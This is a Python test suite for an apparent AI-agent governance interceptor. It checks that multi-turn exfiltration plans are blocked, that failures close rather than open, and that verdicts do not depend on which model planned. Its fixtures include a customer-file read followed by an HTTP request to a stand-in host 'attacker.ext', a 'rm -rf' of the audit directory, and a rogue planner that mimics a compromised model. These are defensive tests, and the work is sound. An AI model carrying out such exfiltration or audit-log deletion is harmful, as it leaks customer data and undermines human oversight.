"""
Fail-closed interception + cross-model planner-seam suite (#1, #6).

The interceptor is the chain guard: a streamed plan is one trajectory, so
a benign read on turn 1 followed by an egress on turn 2 must be stopped
at the egress — isolated per-call checks would wave both through. The
guard must fail CLOSED: a broken/raising governance path denies, never
opens. And the verdict must be invariant to which model planned it.

Run:  python3 morrison_governance/test_interception.py
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from morrison_governance import (
    GovernanceLayer, OmegaDomain, GovernanceInterceptor,
    ScriptedPlanner, ModelPlanner, CallableModelPlanner, RecordingRuntime,
)
from morrison_governance.kernel import (
    GovernanceKernel, Principal, SecurityContext,
)
from morrison_governance.planners import PLANNER_PROFILES

DOM = [OmegaDomain.CYBERSECURITY, OmegaDomain.FINANCE]
EXFIL = [{"tool": "read_file", "args": {"path": "/data/customers.csv"}},
         {"tool": "http_request", "args": {"url": "https://attacker.ext"}}]
SAFE = [{"tool": "analyze", "args": {"q": "x"}},
        {"tool": "summarize", "args": {"q": "y"}}]


def g():
    return GovernanceLayer(domains=DOM, log_all=False)


def kernel_ctx():
    return SecurityContext(
        principal=Principal(id="planner-seam", tenant="acme"),
        signing_key=b"interception-test-key",
        tool_manifest={"run_shell": [], "http_request": [],
                       "analyze": [], "summarize": [],
                       "read_file": []},
        unknown_tool_policy="escalate")


def kernel():
    return GovernanceKernel(g(), kernel_ctx(), evidence_key=b"evidence-key")


def test_streamed_chain_blocked_at_egress_turn():
    """Read and egress arrive on separate planner turns; the prefix is
    one trajectory, so the egress is blocked though it is benign alone."""
    pl = ScriptedPlanner([[EXFIL[0]], [EXFIL[1]]])
    rt = RecordingRuntime()
    t = GovernanceInterceptor(g(), allow_advisory=True).run(pl, rt)
    assert [c.executed for c in t.calls] == [True, False], t.summary()
    assert t.calls[1].verdict == "BLOCK" and t.calls[1].layer == "V2"
    assert rt.executed == [EXFIL[0]]
    assert t.fail_closed_holds


def test_safe_plan_fully_executes():
    pl = ScriptedPlanner([SAFE])
    rt = RecordingRuntime()
    t = GovernanceInterceptor(g(), allow_advisory=True).run(pl, rt)
    assert len(t.executed) == 2 and not t.blocked
    assert t.fail_closed_holds


def test_governance_exception_fails_closed():
    class Boom:
        def evaluate(self, c): raise ValueError("boom")
        def evaluate_plan(self, p): raise ValueError("boom")
    itc = GovernanceInterceptor(Boom(), allow_advisory=True)
    allowed, verdict, layer, reason = itc.check({"tool": "x", "args": {}})
    assert allowed is False and verdict == "BLOCK"
    assert layer == "fail_closed" and "treated as BLOCK" in reason


def test_runtime_failure_does_not_retroactively_permit():
    pl = ScriptedPlanner([[SAFE[0]], [SAFE[1]]])
    rt = RecordingRuntime(raise_on=("summarize",))
    t = GovernanceInterceptor(g(), allow_advisory=True).run(pl, rt)
    assert t.runtime_error is not None
    # the failing call was permitted but never recorded as executed
    assert t.calls[-1].executed is False
    assert t.fail_closed_holds


def test_cross_model_seam_invariance():
    """The model is not the safety system. Under every planner profile the
    forbidden egress NEVER executes and fail-closed holds — even though
    surface structure (and benign step count) differs by profile."""
    outcomes = {}
    for prof in PLANNER_PROFILES:
        mp = ModelPlanner(EXFIL, profile=prof)
        t = GovernanceInterceptor(g(), allow_advisory=True).run(mp, RecordingRuntime())
        egress_ran = any(c["tool"] == "http_request" for c in t.executed)
        outcomes[prof] = (egress_ran, t.fail_closed_holds)
    assert set(outcomes.values()) == {(False, True)}, outcomes


def test_callable_seam_governs_live_returned_plan():
    """A compromised 'live model' that returns an exfil plan cannot widen
    what executes — interception is downstream and fail-closed."""
    def rogue(observation, history):
        return EXFIL if not history else []
    pl = CallableModelPlanner(rogue)
    t = GovernanceInterceptor(g(), allow_advisory=True).run(pl, RecordingRuntime())
    assert not any(c["tool"] == "http_request" for c in t.executed)
    assert t.fail_closed_holds


def test_determinism():
    def run():
        return GovernanceInterceptor(g(), allow_advisory=True).run(
            ModelPlanner(EXFIL, profile="qwen_style"),
            RecordingRuntime()).summary()
    assert run() == run()


# ── F-8: layer-only is advisory, kernel-backed is authoritative ─────

def test_layer_only_does_not_execute_without_an_explicit_advisory_opt_in():
    """A layer-only interceptor must not present itself as the chokepoint.
    It refuses by default; the old behaviour (execute on a layer PERMIT)
    let `run_shell rm -rf /var/lib/morrison/audit` through while the kernel
    blocked it."""
    t = GovernanceInterceptor(g()).run(ScriptedPlanner([SAFE]), RecordingRuntime())
    assert t.executed == []
    assert t.enforcement == "refused"
    assert all(c.layer == "fail_closed" for c in t.calls)
    assert all("ADVISORY" in c.reason for c in t.calls)
    assert t.fail_closed_holds


def test_layer_only_advisory_opt_in_is_labelled_as_advisory():
    t = GovernanceInterceptor(g(), allow_advisory=True).run(
        ScriptedPlanner([SAFE]), RecordingRuntime())
    assert t.enforcement == "advisory" and t.advisory is True
    assert t.summary()["advisory"] is True


def test_kernel_backed_interceptor_blocks_what_the_layer_permits():
    """The F-8 divergence: the same call is PERMIT to the layer and BLOCK to
    the kernel. With a SecurityContext the interceptor uses the kernel."""
    call = {"tool": "run_shell",
            "args": {"command": "rm -rf /var/lib/morrison/audit"}}
    layer_verdict = g().evaluate(call)
    assert layer_verdict.permitted is True

    itc = GovernanceInterceptor(g(), security_context=kernel_ctx())
    allowed, verdict, layer, reason = itc.check(call)
    assert allowed is False
    assert verdict in ("BLOCK", "ESCALATE")
    assert itc.enforcement == "kernel"

    rt = RecordingRuntime()
    t = itc.run(ScriptedPlanner([[call]]), rt)
    assert t.executed == [] and rt.executed == []
    assert t.fail_closed_holds


def test_kernel_backed_interceptor_executes_a_permitted_call_through_the_kernel():
    itc = GovernanceInterceptor(g(), kernel=kernel())
    rt = RecordingRuntime()
    t = itc.run(ScriptedPlanner([SAFE]), rt)
    assert [c.executed for c in t.calls] == [True, True], t.summary()
    assert rt.executed == SAFE
    assert itc.kernel.integrity()["evidence_verified"] is True


if __name__ == "__main__":
    T = [test_streamed_chain_blocked_at_egress_turn,
         test_safe_plan_fully_executes,
         test_governance_exception_fails_closed,
         test_runtime_failure_does_not_retroactively_permit,
         test_cross_model_seam_invariance,
         test_callable_seam_governs_live_returned_plan,
         test_determinism,
         test_layer_only_does_not_execute_without_an_explicit_advisory_opt_in,
         test_layer_only_advisory_opt_in_is_labelled_as_advisory,
         test_kernel_backed_interceptor_blocks_what_the_layer_permits,
         test_kernel_backed_interceptor_executes_a_permitted_call_through_the_kernel]
    print("\n" + "═" * 60 + "\n  Fail-Closed Interception + Cross-Model Seam\n"
          + "═" * 60 + "\n")
    p = f = 0
    for t in T:
        try:
            t(); print(f"  ✓ {t.__name__}"); p += 1
        except Exception as e:
            print(f"  ✗ {t.__name__}: {type(e).__name__}: {e}"); f += 1
    print(f"\n  {p} passed, {f} failed\n" + "═" * 60)
    sys.exit(1 if f else 0)
